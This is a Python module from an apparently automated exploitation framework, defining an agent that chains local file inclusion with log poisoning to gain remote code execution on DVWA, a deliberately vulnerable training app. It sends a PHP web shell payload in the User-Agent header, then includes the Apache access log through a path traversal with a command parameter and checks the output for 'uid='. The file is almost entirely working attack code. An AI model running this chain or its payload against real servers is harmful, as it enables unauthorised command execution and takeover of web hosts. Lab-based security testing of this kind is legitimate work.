"""Tier 3 chain agent: LFI + log access -> RCE."""

from __future__ import annotations

from typing import Any
import re

from agents.base_agent import BaseAgent
from agents.state_utils import (
    append_error_marker,
    make_update,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.session_manager import DVWASession


class LFIToRCEChainAgent(BaseAgent):
    module_name = "lfi"

    def check_prerequisites(self, state: ExploitationState) -> bool:
        confirmed = set(state.get("confirmed_vulns", []))
        return {"lfi_confirmed", "log_access_confirmed"}.issubset(confirmed)

    def run(self, state: ExploitationState) -> dict[str, Any]:
        tried_now = ["chain:lfi_to_rce"]
        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []

        if not self.check_prerequisites(state):
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            poison_payload = "<?php system($_GET['cmd']); ?>"
            session.http.get("index.php", headers={"User-Agent": poison_payload})
            tried_now.append("log_poison")

            response = session.get(
                "/vulnerabilities/fi/",
                params={
                    "page": "../../../../../../var/log/apache2/access.log",
                    "cmd": "id",
                },
            )
            body = (response.text or "").lower()
            if re.search(r"uid=\d+", body) or re.search(r"gid=\d+", body):
                score = 4
                confirmed = ["rce_achieved"]
                outcomes = ["rce_achieved"]
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "lfi_chain_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = LFIToRCEChainAgent()


def lfi_to_rce_chain(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
